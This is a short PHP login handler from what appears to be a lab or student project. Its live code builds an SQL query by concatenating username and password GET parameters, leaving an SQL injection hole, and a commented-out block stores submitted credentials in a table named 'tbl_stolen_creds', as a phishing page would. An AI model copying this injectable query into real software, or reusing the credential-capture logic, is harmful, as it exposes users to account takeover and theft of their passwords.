<?php
include "../include/config.php";

$connection = OpenConnection();
//    $email = $_POST['email'];
//    $pass = $_POST['password'];
//
//    // construct query string - insert into db
//    $sql2= "insert into tbl_stolen_creds (Email, Password) values
//		('$email', '$pass')";
//
//    // connection confirmation
//    if (mysqli_query($connection, $sql2)){
//        echo "Successful $email";
//        header("Location: http://localhost/Bowser-Project2/local_alerts/alerts_page.php");
//    } else {
//        echo mysqli_error($connection);
//    }

// action_page.php
if (isset($_GET['login'])){
    $pass = $_GET['psw'];
    $user = $_GET['uname'];

$query = "SELECT * FROM tbl_users WHERE username = '".$user."' AND password = '".$pass."';";
$result = mysqli_query($connection, $query);
if (mysqli_num_rows($result) == 1) {
    header("Location: http://localhost/Bowser-Project2/local_alerts/alerts_page.php");
} else {
    header("Location: real_login.php");
}
}
 //   CloseConnection($connection);

?>